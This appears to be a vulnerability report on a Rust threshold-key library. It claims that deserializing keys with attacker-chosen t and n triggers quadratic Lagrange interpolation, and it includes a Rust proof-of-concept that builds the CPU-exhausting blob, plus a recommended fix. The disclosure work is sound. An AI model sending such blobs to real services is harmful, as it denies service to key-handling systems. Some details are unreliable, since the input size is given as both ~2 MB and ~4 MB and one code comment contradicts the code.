### Title
`ThresholdKeys::read` performs O(t²) Lagrange interpolation over attacker-controlled participant counts, enabling CPU-exhaustion DoS from ~2 MB of untrusted bytes - (File: crypto/dkg/src/lib.rs)

### Summary
Analogous to the JsonPath ReDoS (attacker-controlled input compiled into unbounded expensive work), `ThresholdKeys::read` accepts attacker-controlled `t`/`n` parameters and unconditionally computes the `group_key` via Lagrange interpolation over participants `1..=t`. `interpolation_factor` is O(t) per participant and is evaluated for every participant, yielding O(t²) field multiplications plus `t` field inversions — up to ~4.3·10⁹ multiplications for `t = n = 65535` — with no threshold or participant-count cap enforced before the work is performed.

### Finding Description
`ThresholdKeys::read` reads `t`, `n`, and `i` directly from the byte stream (`crypto/dkg/src/lib.rs:591-602`), reads `n` verification shares (line 620-623), then calls `ThresholdKeys::new`. `ThresholdKeys::new` (lines 376-378) computes:

```rust
let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
let group_key =
  t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

`Interpolation::Lagrange::interpolation_factor` (lines 229-247) iterates the entire `included` set per participant, so deriving `group_key` costs `t` × `t` field multiplications and `t` modular inversions. `ThresholdParams::new` (lines 166-179) only checks `t <= n` and `t, n != 0`; both are `u16`, so an attacker can set `t = n = 65535`. The same quadratic loop runs again in `ThresholdKeys::view` (lines 500-507) for any caller-supplied `included` set.

The input needed to trigger this is ~`6 + n·(F_len + G_len)` bytes — roughly 4 MB for Ristretto — a trivially small message that pins a worker for a very large number of group/scalar operations. Since `ThresholdKeys::read` is a listed deserialization sink for untrusted bytes, an unprivileged party can feed this encoding to any host that deserializes threshold keys.

### Impact Explanation
A single small message causes the victim to burn CPU quadratic in an attacker-chosen parameter (max ~65535² field multiplications plus 65535 inversions and point operations). Repeated submissions allow an unprivileged attacker to pin worker CPU and deny service to key-handling/signing paths — the same availability impact as the reference advisory (CVSS VA:H, no confidentiality/integrity impact), i.e. Medium.

### Likelihood Explanation
Reachable wherever untrusted bytes are passed to `ThresholdKeys::read` (key-share loading, recovery/promotion flows). The attacker controls `t` and `n` directly in the serialized blob; no authentication or prior state is needed to reach the quadratic path — it runs inside deserialization itself, before any semantic check could reject the keys.

### Recommendation
Cap `t`/`n` to a protocol-meaningful maximum (e.g. the real validator set size) inside `ThresholdParams::new` or at the `read` boundary, and/or compute `group_key` with a linear-time evaluation (incremental numerator/denominator products) rather than per-participant O(t) factors. Alternatively defer `group_key` computation until the keys are actually used.

### Proof of Concept
```rust
use std::io;
use ciphersuite::{Ciphersuite, Ristretto};
use dkg::ThresholdKeys;
use group::GroupEncoding;

// Build a serialized ThresholdKeys blob with t = n = 65535 (Lagrange interpolation).
fn malicious_blob() -> Vec<u8> {
    let mut buf = vec![];
    let n: u16 = u16::MAX; // 65535
    let t: u16 = u16::MAX;

    // Curve ID header
    buf.extend_from_slice(&(Ristretto::ID.len() as u32).to_le_bytes());
    buf.extend_from_slice(Ristretto::ID);
    // t, n, i
    buf.extend_from_slice(&t.to_le_bytes());
    buf.extend_from_slice(&n.to_le_bytes());
    buf.extend_from_slice(&1u16.to_le_bytes()); // i = 1
    // Interpolation::Lagrange
    buf.push(1);
    // secret_share
    buf.extend_from_slice(<Ristretto as Ciphersuite>::F::ZERO.to_repr().as_ref());
    // n verification shares (identity is fine for reaching the loop)
    for _ in 0 .. n {
        buf.extend_from_slice(<Ristretto as Ciphersuite>::generator().to_bytes().as_ref());
    }
    buf
}

// Roughly 4 MB of input -> ThresholdKeys::new evaluates
// interpolation_factor for each of 65535 participants, each iterating 65535
// entries: ~4.3e9 field multiplications + 65535 inversions.
let mut slice = &malicious_blob()[..];
let _keys = ThresholdKeys::<Ristretto>::read(&mut slice); // pins CPU
```

Relevant code: [1](#0-0) , [2](#0-1) , [3](#0-2) , [4](#0-3) .

### Citations

**File:** crypto/dkg/src/lib.rs (L226-248)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
    }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L500-507)
```rust
    let mut verification_shares = HashMap::with_capacity(included.len());
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
    }
```

**File:** crypto/dkg/src/lib.rs (L574-632)
```rust
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
```
